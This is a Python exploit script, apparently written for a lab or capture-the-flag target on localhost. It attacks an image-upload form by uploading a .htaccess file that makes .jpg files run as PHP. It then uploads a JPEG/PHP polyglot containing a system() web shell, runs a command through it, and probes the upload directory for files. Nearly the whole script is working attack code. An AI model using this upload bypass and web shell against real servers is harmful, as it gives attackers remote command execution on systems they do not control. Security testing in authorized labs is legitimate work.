import requests
import re
import os

base_url = "http://127.0.0.1:32824"
print("Testing for Apache htaccess/htpasswd bypass")
print("=" * 60)

# Try to upload .htaccess to force PHP execution
htaccess_content = b"AddHandler application/x-httpd-php .jpg"

print("\n[1] Attempting to upload .htaccess to force PHP execution")
files = {'userfile': ('.htaccess', htaccess_content, 'text/plain')}
data = {'submit': 'Upload Image'}

try:
    response = requests.post(f"{base_url}/index.php", files=files, data=data, timeout=10)
    print(f"Status: {response.status_code}")
    if "successfully uploaded" in response.text:
        print("✅ .htaccess uploaded!")
        
        # Now try the polyglot again
        polyglot_content = (
            b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x48\x48\x00\x01\x00\x01\x00\x00"
            b"<?php system($_GET['cmd']); ?>"
            b"\xff\xd9"
        )
        
        print("\n[2] Uploading polyglot shell.jpg after .htaccess")
        files2 = {'userfile': ('shell.jpg', polyglot_content, 'image/jpeg')}
        resp2 = requests.post(f"{base_url}/index.php", files=files2, data=data, timeout=10)
        
        if "successfully uploaded" in resp2.text:
            print("✅ shell.jpg uploaded!")
            match = re.search(r"href='([^']+)'", resp2.text)
            if match:
                upload_path = match.group(1)
                file_url = f"{base_url}/{upload_path}"
                
                print(f"\n[3] Testing PHP execution with .htaccess override")
                test_url = f"{file_url}?cmd=ls"
                exec_resp = requests.get(test_url, timeout=10)
                
                print(f"URL: {test_url}")
                print(f"Status: {exec_resp.status_code}")
                print(f"Content-Type: {exec_resp.headers.get('content-type', 'unknown')}")
                
                if exec_resp.status_code == 200 and "image/jpeg" not in exec_resp.headers.get('content-type', ''):
                    print(f"🔍 Response:\n{exec_resp.text[:2000]}")
                else:
                    print("→ PHP still not executing")
        else:
            print("❌ shell.jpg upload failed")
    else:
        print("❌ .htaccess upload rejected")
except Exception as e:
    print(f"Error: {e}")

print("\n" + "=" * 60)
print("htaccess test complete.")

# Also try to enumerate whats in the upload directory via timing attacks
print("\n\nTesting for directory listing via file existence")
print("=" * 60)

test_files = ['.htaccess', 'index.php', 'robots.txt', 'shell.jpg']
for filename in test_files:
    url = f"{base_url}/upload/{filename}"
    try:
        resp = requests.get(url, timeout=5)
        print(f"{filename}: {resp.status_code} (Size: {len(resp.content)})")
    except Exception as e:
        print(f"{filename}: Error - {e}")
